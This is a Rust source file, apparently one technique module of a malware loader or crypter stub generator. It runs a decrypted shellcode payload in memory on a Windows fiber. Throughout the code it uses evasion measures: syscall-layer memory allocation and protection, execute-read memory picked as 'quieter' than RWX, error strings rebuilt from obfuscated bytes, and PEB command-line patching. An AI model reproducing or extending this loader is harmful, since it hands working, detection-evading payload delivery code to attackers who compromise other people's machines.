// --- Fiber execution (technique fragment) ---
//
// This file is injected verbatim into the generated stub's `mod step_<index>`
// when the technique is selected, so it is self-contained: its own `use`
// statements, types and helpers, all resolved inside that module.
//
// Per-build values use the technique's placeholder tokens, substituted by
// `Params::render_fragment_for` (see `mod.rs`); the tokens are not valid Rust
// identifiers, so nothing can rewrite them silently. Do not switch back to
// double-brace placeholders: those are valid Rust (nested blocks), and tooling
// reformats them into something the substitution no longer matches.
//
// Two ABI boundaries are explicit here:
//
//   - the fiber start routine is `extern "system" fn(*mut c_void)`, the
//     `PFIBER_START_ROUTINE` shape kernel32 calls the fiber with;
//   - the payload is entered as `extern "system" fn() -> u32`, the same shape
//     `reflective_loading`'s shellcode runner uses, so a payload behaves the
//     same under either technique (no arguments, exit code in `eax`/`rax`).
//
// A fiber function that *returns* makes the current thread exit (the Windows
// "Using Fibers" sample states it plainly, and it was measured: the process
// ended silently right after the fiber function returned), so `payload_fiber`
// never returns: once the payload's entry point has returned it schedules the
// loader's fiber again with an explicit `SwitchToFiber`, and the loader deletes
// it from there.
//
// The payload is copied into its own private region before it runs. Protecting
// the *decrypted buffer's* own pages instead was measured to break the switch:
// the loader's fiber state is a heap allocation like the buffer, so the two can
// share a page, and `SwitchToFiber` saves the loader's context into that page —
// which faults (hangs) when the page was made RX. A dedicated region removes the
// sharing by construction.

use core::ffi::c_void;
use core::ptr;

use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
};
use windows::Win32::System::Threading::{
    ConvertFiberToThread, ConvertThreadToFiber, CreateFiberEx, DeleteFiber, GetCurrentProcess,
    SwitchToFiber,
};
use windows::Win32::System::WindowsProgramming::FIBER_FLAG_FLOAT_SWITCH;

/// Entry signature of the payload: raw code entered with the Windows calling
/// convention, no arguments, the process exit code returned in `eax` (`rax` on
/// x64) — the same contract `reflective_loading` gives shellcode.
///
/// A payload that expects its own configuration block as an argument is out of
/// scope: the technique has no way to declare one, and the loader does not
/// invent arguments it cannot describe.
type ShellcodeEntry = unsafe extern "system" fn() -> u32;

/// State shared between the loader fiber and the payload fiber.
///
/// It lives in the loader's *stack* frame on purpose: the hand-off between the
/// two fibers does not depend on the heap, and the payload region (which is made
/// executable while the payload runs) can never overlap it. The thread's stack is
/// a different mapping and is never protected.
struct FiberContext {
    /// Address of the executable copy of the payload.
    entry: usize,
    /// The fiber the thread was converted to; the payload fiber switches back
    /// to it when the payload returns.
    loader: usize,
    /// The payload's return value, captured before the switch back.
    exit_code: u32,
}

/// Appends the NTSTATUS to a label (which is rebuilt from obfuscated bytes at
/// the call site, so this literal carries no diagnostic text).
fn nt_error(label: String, status: i32) -> String {
    format!("{label} (0x{:08x})", status as u32)
}

/// Fiber start routine: runs the payload on its own fiber, then schedules the
/// loader fiber again.
///
/// It must never return, or it would terminate the loader's thread together
/// with the fiber (see the file header); the explicit switch back is what makes
/// the technique a *returning* one.
unsafe extern "system" fn payload_fiber(parameter: *mut c_void) {
    // SAFETY: `parameter` is the `&mut FiberContext` the loader passed to
    // `CreateFiberEx`. The loader's frame outlives this fiber: it only deletes
    // the fiber after this routine has scheduled it back.
    let context = unsafe { &mut *(parameter as *mut FiberContext) };
    // SAFETY: `entry` points at the private copy of the payload; `run_on_fiber`
    // made those pages executable before switching here and keeps them mapped
    // for the whole switch.
    let entry: ShellcodeEntry = unsafe { core::mem::transmute(context.entry) };
    let code = unsafe { entry() };
    // The loader reads this through `read_volatile` after it is scheduled back;
    // the volatile write/read pair is what makes the hand-off across the two
    // fibers explicit to the optimizer.
    unsafe { ptr::write_volatile(&mut context.exit_code, code) };
    // SAFETY: `loader` is the fiber this thread was converted from (the loader's
    // own frame), so switching to it resumes `run_on_fiber` right after its
    // `SwitchToFiber` call. This fiber is deleted there.
    unsafe { SwitchToFiber(context.loader as *const c_void) };
    // Not reached.
}

/// Copies the payload into a fresh private region, makes it executable and runs
/// it on a fiber; the payload's exit code is the result.
///
/// The region is intentionally leaked, exactly like `reflective_loading`'s
/// shellcode region: the payload may have spawned work that keeps running from
/// its own image after the entry point returned, and the stub has no
/// `NtFreeVirtualMemory` helper (`nt_free_vm`) to release it.
fn run_on_fiber(image: &[u8]) -> Result<i32, String> {
    // SAFETY: the function drives documented kernel32 fiber APIs and the
    // syscall layer's nt_* helpers. The context lives in this frame (see
    // `FiberContext`), so it outlives the payload fiber, and every failure path
    // releases the thread conversion before returning.
    unsafe {
        let process = GetCurrentProcess();

        // A dedicated region, not the decrypted buffer's own pages: the heap
        // pages can also hold the loader's fiber state, and the switch saves the
        // loader's context there (see the file header).
        let mut base: *mut c_void = ptr::null_mut();
        let mut region = image.len();
        let status = crate::nt_alloc_vm(
            process,
            &mut base,
            0,
            &mut region,
            MEM_COMMIT.0 | MEM_RESERVE.0,
            PAGE_READWRITE.0,
        );
        if status < 0 {
            return Err(nt_error($MSG_ALLOC_FAILED$, status));
        }
        ptr::copy_nonoverlapping(image.as_ptr(), base as *mut u8, image.len());

        // Only fibers can schedule fibers: the thread has to be converted
        // first. The call fails (NULL) when the thread already is a fiber — a
        // foreign stub converted it, or an earlier payload did and never
        // converted back. windows-rs exposes no `GetCurrentFiber` (`FiberData`
        // lives in the TEB, which would need hand-written assembly), and without
        // that handle the payload fiber could never schedule the loader again,
        // so this is a clean error rather than a switch to nowhere.
        let loader = ConvertThreadToFiber(None);
        if loader.is_null() {
            return Err($MSG_CONVERT_FAILED$);
        }

        let mut context = FiberContext {
            entry: base as usize,
            loader: loader as usize,
            exit_code: 0,
        };

        // The fiber object and its stack are allocated here (heap activity of
        // their own; they never share the payload region).
        //
        // `FIBER_FLAG_FLOAT_SWITCH`: on x86 the floating-point state is not
        // switched without it, so the payload's FP use would corrupt the
        // loader's state (on x64 the state is part of the fiber context anyway).
        let fiber = CreateFiberEx(
            0,
            0,
            FIBER_FLAG_FLOAT_SWITCH,
            Some(payload_fiber),
            Some(&mut context as *mut FiberContext as *const c_void),
        );
        if fiber.is_null() {
            let _ = ConvertFiberToThread();
            return Err($MSG_CREATE_FIBER_FAILED$);
        }

        // Make the copy executable. Read-only is enough for a code blob and is
        // the quieter choice than RWX; a payload that writes to its own image
        // is out of scope.
        let mut old_protect = 0u32;
        let status = crate::nt_protect_vm(
            process,
            base,
            region,
            PAGE_EXECUTE_READ.0,
            &mut old_protect,
        );
        if status < 0 {
            let _ = DeleteFiber(fiber as *const c_void);
            let _ = ConvertFiberToThread();
            return Err(nt_error($MSG_PROTECT_FAILED$, status));
        }

        crate::tech_dbg!(
            "fibers",
            "payload mapped at {base:p} ({region} bytes), scheduling the payload fiber"
        );
        // Returns only when the payload fiber schedules `loader` again — that
        // is, after the payload's entry point returned. A payload that never
        // returns (an endless loop, `ExitThread`, `ExitProcess`) never gives the
        // loader back its thread.
        SwitchToFiber(fiber as *const c_void);

        // Order matters: `ConvertFiberToThread` releases the thread's fiber
        // state and no fiber call may follow it, so the payload fiber is deleted
        // first. It is suspended inside its switch back (not the running fiber),
        // so deleting it just frees its stack.
        DeleteFiber(fiber as *const c_void);
        let _ = ConvertFiberToThread();

        let code = ptr::read_volatile(&context.exit_code);
        crate::tech_dbg!("fibers", "the payload fiber returned {code}");
        Ok(code as i32)
    }
}

/// Adapter expected by the stub skeleton (`payload()` calls this with the
/// decrypted payload).
pub fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
    // The format guard is substituted as a boolean literal: `true` for a
    // shellcode payload, `false` otherwise. The branch body still has to
    // type-check in both cases, so the (obfuscated) message is substituted
    // either way and folded away when the branch is dead.
    if !$SUPPORTED_FORMAT$ {
        return Err($MSG_UNSUPPORTED_FORMAT$);
    }
    if image.is_empty() {
        return Err($MSG_EMPTY$);
    }
    // The payload runs in *this* process, so it inherits the loader's command
    // line: point the PEB (and kernelbase's cached pointer) at the configured
    // `build.payloads.<name>.args` first, exactly like `reflective_loading`'s
    // shellcode runner. A payload behaves the same under either technique.
    crate::patch_command_line()?;
    run_on_fiber(image)
}
